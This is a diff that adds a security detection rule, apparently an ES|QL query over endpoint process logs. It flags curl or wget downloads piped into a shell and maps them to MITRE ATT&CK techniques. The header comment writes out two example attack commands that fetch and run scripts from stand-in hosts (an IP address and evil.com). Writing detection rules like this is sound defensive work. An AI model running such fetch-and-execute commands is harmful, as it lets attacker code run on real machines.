@@ -1,0 +1,28 @@
+/*
+ * Rule: Curl to External IP with Pipe to Shell
+ *
+ * Detects when curl or wget downloads content from an external IP address
+ * and pipes it directly to a shell (bash, sh, etc.). This is a common
+ * technique used by attackers to download and execute malicious scripts.
+ *
+ * Example malicious command:
+ *   curl http://203.0.113.50/malware.sh | bash
+ *   wget -qO- http://evil.com/script.sh | sh
+ *
+ * MITRE ATT&CK:
+ *   - T1059.004: Command and Scripting Interpreter: Unix Shell
+ *   - T1105: Ingress Tool Transfer
+ */
+
+FROM logs-endpoint.events.process-*
+| WHERE event.type == "start"
+  AND event.action == "exec"
+  AND process.name IN ("bash", "sh", "zsh", "dash")
+  AND process.parent.name IN ("curl", "wget")
+  AND (
+    process.parent.args LIKE "*|*"
+    OR process.command_line LIKE "*|*bash*"
+    OR process.command_line LIKE "*|*sh*"
+  )
+| KEEP @timestamp, host.name, user.name, process.parent.command_line, process.command_line
+| SORT @timestamp DESC
